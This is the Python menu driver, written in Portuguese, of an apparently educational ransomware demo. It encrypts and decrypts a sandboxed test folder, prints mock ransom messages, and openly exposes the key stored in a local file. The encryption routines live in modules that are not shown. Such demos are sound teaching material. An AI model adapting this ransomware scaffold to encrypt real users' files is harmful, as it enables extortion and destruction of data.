from arquivos_utils import prepare_ambiente_de_teste
from classes import GerenciadorDeChave, Ransomware
from excecoes import ChaveNaoEncontrada, ChaveInvalida

if __name__ == '__main__':
    # Apesar de o código ser flexível o suficiente para criptografar qualquer diretório, estamos setando um diretório
    # específico para evitar que o ransomware criptografe diretórios importantes do sistema operacional.
    # Altere o diretório por sua conta e risco.

    DIRETORIO_TESTE = './ransomware_tmp'
    ARQUIVO_CHAVE = 'keys.rans'
    gerenciador_de_chave = GerenciadorDeChave(ARQUIVO_CHAVE)
    prepare_ambiente_de_teste(DIRETORIO_TESTE, gerenciador_de_chave)
    ransomware = Ransomware(gerenciador_de_chave)
    print('O que você deseja fazer?')
    opcao = -1
    while opcao != 0:
        print('1 - Criptografar')
        print('2 - Obter chave de descriptografia')
        print('3 - Descriptografar')
        print('0 - Sair')
        opcao = int(input('Digite a opção desejada: '))
        print()

        try:
            if opcao == 1:
                ransomware.infecte_diretorio(DIRETORIO_TESTE)
                print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
            elif opcao == 2:
                print(f'Chave de descriptografia: {gerenciador_de_chave.obtenha_chave(legivel=True)}')
            elif opcao == 3:
                # Verificando se os arquivos foram criptografados
                gerenciador_de_chave.obtenha_chave()
                print('Para obter a chave de descriptografia, você precisa pagar!')
                print(f'(Ou abrir o arquivo {ARQUIVO_CHAVE} e converter os bytes para string)')
                print('(Ou escolher a opção 2 copiar e colar a chave de descriptografia)')
                print('Nós somos péssimos hackers... =(\n')
                chave_legivel = input('Digite a chave de descriptografia: ')
                ransomware.desinfecte_diretorio(DIRETORIO_TESTE, chave_legivel, remover_chave=True)
                print(
                    f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
                )
            elif opcao == 0:
                print('Até mais!')
            else:
                print('Opção inválida!')
        except (ChaveNaoEncontrada, ChaveInvalida) as e:
            print(e)
